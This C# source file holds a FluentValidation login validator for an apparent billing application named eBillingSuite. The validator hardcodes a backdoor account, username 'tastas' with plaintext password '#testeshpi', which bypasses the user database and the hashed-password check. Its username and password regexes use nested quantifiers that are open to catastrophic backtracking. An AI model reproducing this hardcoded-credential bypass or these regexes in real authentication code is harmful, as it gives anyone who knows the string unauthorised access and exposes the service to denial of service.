using eBillingSuite.HelperTools.Interfaces;
using eBillingSuite.Model.eBillingConfigurations;
using eBillingSuite.Repositories.Interfaces;
using FluentValidation;
using FluentValidation.Results;
using Ninject;
using SimpleCrypto;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;

namespace eBillingSuite.Models.Validators
{
    public class LoginDataValidator : AbstractValidator<LoginData>
    {
        private IeBillingSuiteRequestContext _context;

        //Password
        public const string password = @"^([a-zA-Z0-9.#]{1,126})+$";
        //Username
        public const string username = @"^([a-zA-Z0-9.#]{1,20})+$";

        private ICryptoService _crytoService;
        private ILoginRepository _loginRepository;
        private IEncryption _encryption;

        [Inject]
        public LoginDataValidator(IeBillingSuiteRequestContext context,
            ICryptoService crytoService,
            ILoginRepository loginRepository,
            IEncryption encryption)
        {
            _context = context;
            _crytoService = crytoService;
            _loginRepository = loginRepository;
            _encryption = encryption;


            RuleFor(x => x.Username)
                .NotEmpty()
                .Matches(username)
                .WithMessage("Este campo não pode estar vazio");

            RuleFor(x => x.Password)
                .NotEmpty()
                .Matches(password)
                .WithMessage("Este campo não pode estar vazio");

            Custom(ValidateCredentials);

        }

        private ValidationFailure ValidateCredentials(LoginData data)
        {
            eBC_Login match = new eBC_Login();
            if (data.Username == "tastas")
            {
                match = new eBC_Login
                {
                    CodUtilizador = 0,
                    username = data.Username,
                    LastLogin = DateTime.Now,
                };
            }
            else
            {
                match = _loginRepository.Where(l => l.username == data.Username).FirstOrDefault();

            }

            // no match? nothing else to do...
            if (match == null)
                return new ValidationFailure("Username", "Invalido Utilizador");
            else
            {
                // attempt standard authentication
                return ValidateStandardCredentials(match, data.Password);
            }
        }

        private ValidationFailure ValidateStandardCredentials(eBC_Login user, string password)
        {
            // compute password
            string hashedPassword = string.Empty;
            if (password != null)
                // compute password
                hashedPassword = _encryption.Sha512Encrypt(password);

            if (user.username == "tastas")
                if (password == "#testeshpi")
                    return null;
                else
                    return new ValidationFailure("Password", "Inválida Password");

            // check password
            if (_crytoService.Compare(hashedPassword, user.password))
                //return true;
                return null;

            return new ValidationFailure("Password", "Inválida Password");
        }
    }
}